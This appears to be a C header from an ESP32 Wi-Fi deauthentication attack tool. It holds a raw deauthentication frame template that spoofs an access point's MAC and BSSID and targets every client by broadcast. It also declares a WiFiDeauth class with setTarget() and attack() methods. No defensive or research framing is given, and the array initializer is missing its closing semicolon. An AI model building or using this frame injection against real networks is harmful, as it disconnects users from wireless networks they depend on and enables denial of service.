#ifndef WIFIDEAUTH_H
#define WIFIDEAUTH_H

#include <esp_wifi.h>
#include <WiFi.h>

uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,                   // Frame Control and Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // Destination MAC (broadcast)
  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,       // Source MAC (spoofed AP)
  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,       // BSSID (spoofed AP)
  0x00, 0x00,                               // Sequence Number
  0x07, 0x00                                // Reason Code (7 = Class 3 Frame Received from Nonassociated STA)
}

class WiFiDeauth {
  public:
    void setup();
    void setTarget();
    void attack();
};

#endif